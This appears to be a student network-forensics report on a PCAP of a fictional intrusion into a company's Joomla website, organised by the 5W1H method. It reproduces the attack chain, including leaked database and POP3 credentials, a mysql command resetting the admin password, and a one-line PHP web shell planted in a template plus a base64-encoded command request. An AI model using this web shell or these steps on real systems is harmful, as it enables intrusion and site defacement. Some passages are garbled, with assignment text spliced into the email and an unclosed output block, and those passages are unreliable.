# Network Forensic Analysis

## Assignment

```
The Potenzio company requests that you analyze the attached PCAP file and 
create a written report (suggested length: 2 pages) detailing whether any 
malicious activities occurred and providing a timeline of the related events.

Please organize the report using the 5W1H method (Who, What, Where, When,
Why, How) and specify the timestamp and hashes of related artifacts for 
each event.

Note the following hints:
	
	The IP address 203.0.113.2 is used by Potenzio as a
	masquerade address.
    
	The IP address 203.0.113.113 is the providerâ€™s DNS
	address.

Both of the above addresses can be considered trusted.
Please ignore Layer 2 information.
```

## 1. Who?

The given pcap file displayed normal network activity of different actors among which we can find :
- **libre0ffice.com**, the attacker, acting under the IP address **58.16.123.111**.
- **potenzio's net**, the attacked, using the masquerade address **203.0.113.2**
- **potenzio's provider**, using the DNS address **203.0.113.113**
## 2. What happened?

An attacker managed to access potenzio's servers and left a menacing message on their website's index page using the template utilities of the admin dashboard.

## 3. Where did it take places?

The attacker used the credentials of a potenzio's employee to access the servers and the database of the company that let him modify the credentials of an admin account. Using the new credentials he then logged into the admin dashboard a finalized the attack.

## 4. When did it take place?

- **2024-05-12 10:27:33 UTC**
	The attacker sent a email to claudio.volume@potenzio.com spoofing his credentials while doing so
	
- **2024-05-12 10:28:23 UTC** 
	The attacker accessed the potenzio's backend server using the credentials previously acquired installing then mysql-client to modify an admin account with a password of its choice.
	
- **2024-05-12 10:28:52 UTC** 
	The attacker logged into the administration dashboard with the account previously modified and downloaded some templates for the website's index page. 
	Using those templates he forged a new one that could be used as a reverse shell.
	After doing so the attacker performed the real attack appending to index page a menacing message using the exploit he created.

## 5. Why did it happen?

The attack was carried out by a group of eco-cyber-activists known as EcoDefenders, aiming to threaten Potenzio's company by disrupting access to their website.
In the message left on the index page, the activists claimed responsibility, citing the company's prolonged pollution and illegal toxic waste production as their motivation.
They described the attack as a warning and promised more severe actions if the company does not adopt environmentally friendly policies.

## How did it happen?

### Information gathering
#### 2024-05-12 10:26:19 UTC
The attacker started a port-scanning session and tried also to access the admin page with default credentials but didn't succeed in doing so.

He then sent a targeted request to **"www.potenzio.com/administrator/manifests/files/joomla.xml"** that describes the complete structure of the joomla extension configuration, from which is possible to gather informations about the DB structure as well.

Knowing this the attacker sent another request to **"www.potenzio.com/api/index.php/v1/config/application?public=true"** that responded with a json file with the complete db configuration including the password

```json
...
{
	"type": "application",
    "id": "224",
    "attributes": {
	    "dbtype": "mysqli",
	    "id": 224
	}
},
{
	"type": "application",
    "id": "224",
    "attributes": {
	    "host": "10.0.100.100",
	    "id": 224
    }
},
{
    "type": "application",
    "id": "224",
    "attributes": {
	    "user": "joomla",
	    "id": 224
    }
},
{
	"type": "application",
	"id": "224",
	"attributes": {
	    "password": "secret4joomla",
	    "id": 224
    }
},
{
	"type": "application",
	"id": "224",
	"attributes": {
	    "password": "secret4joomla",
	    "id": 224
    }
},
...
```

He then tried to use the password to access the admin page but that didn't work 

### Sending the email
#### 2024-05-12  10:27:33 UTC
The attacker sent an email to a Potenzio employee disguising himself for a society called **harmonic.com**  with some *"exclusive offers"* just for him as we can read in the message body:

```html
<html>
  <head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
  </head>
  <body>
    <p>Dear Claudio,</p>
    <p>Please find attached <b>exclusive offerBoth of the above addresses can be considered trusted. Please ignore Layer 2 is</b> for you.</p>
    <p>Cheers</p>
    <p>Jan Bauer<br>
    </p>
  </body>
</html>
```

Opening the pcap file with Network Miner we can see some informations about the message itself

![](./assets/Network_Assignment_NetworkMiner.png)

Taking a closer look it's possible to see that the mail was sent from a pretty suspicious address ( **smtp.harmonic.com (mx.lockermaster.lol \[58.16.123.111]**) and contained an attachment called [offers.odt](./assets/harmonic_email_attachment).
Notice that the ip address found in the server is the same as the attacker's one.

Although the attached file seemed to be clean the messages where exchanged using POP3 communication protocol and analysing the packets with a tool like Wireshark  Claudio's credentials could be spoofed easily.

![](./assets/Network_Assingment_pop_credentials_leaking.png)

We can see that the credentials used where:

```
User: claudio.volume
Password: claudione
```


### Accessing the backend server
#### 2024-05-12 10:28:23 UTC

Using these credentials the attacker invoked a shell on the server, installed mysql-client and accessed the Joomla database changing the password for the admin account to one of his choice:

```bash
claudio.volume@client:/$ mysql -u joomla --password=secret4joomla -h 10.0.100.100 joomladb -e "Update pnv1x_users SET password = 'd2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199' WHERE name='admin';"
```


### Modifying the index page
#### 2024-05-12 10:28:52 UTC

After that he forged a new template where the value of a parameter called *random*, that could be pretty much anything, can be sent in a GET request to the index.php page.
If the value of the random parameter is some valid command once decoded from base64 is then executed on the server using the *system* command.

```php
[ content of the index page ]
.
.
.
    <?php if (isset($_GET['rand'])) system(base64_decode($_GET['rand'])); ?>
    <jdoc:include type="modules" name="debug" style="none" />
</body>
</html>
&task=template.apply&6ac867e6369185055f5b1ad928d7cbe6=1&jform[extension_id]=223&jform[filename]=/var/www/html/templates/cassiopeia/index.php
```

*relevant fragment of the attacker's template*

Doing so the attacker has access to a reverse shell on the potenzio's server.
The attacker then tested the newly created template sending a request where the *random* parameter's value was decoded into the  **ls -la** command, exposing the files present on the server

Attacker's forged url :

```
http://www.potenzio.com/?rand=bHMgLWxhCg==
```

Decoded parameter:

```bash
> base64 -d parameter.txt
ls -la
```

Web page output:

```

After that the attacker proceeded to send another request with the final payload performing the attack itself that overwrote the index page of the Potenzio's website

Greetings,
We are EcoDefenders. 
We have disrupted access to the Potenzio website for one simple reason: your polluting presence on our planet can no longer be ignored.
For years, Potenzio has disregarded the warnings of scientists, violated environmental regulations, and compromised the health of thousands with its toxic emissions. 
We cannot stand by silently while our planet suffers.
This defacement is a warning. Change your practices, reduce pollution, and respect the Earth. It is not too late to make a difference, but time is running out.

If Potenzio does not begin to take concrete measures to improve its environmental footprint, we will ensure that the world knows every destructive action they take. This is just the beginning.

Act now. Our planet cannot wait any longer.

EOF"
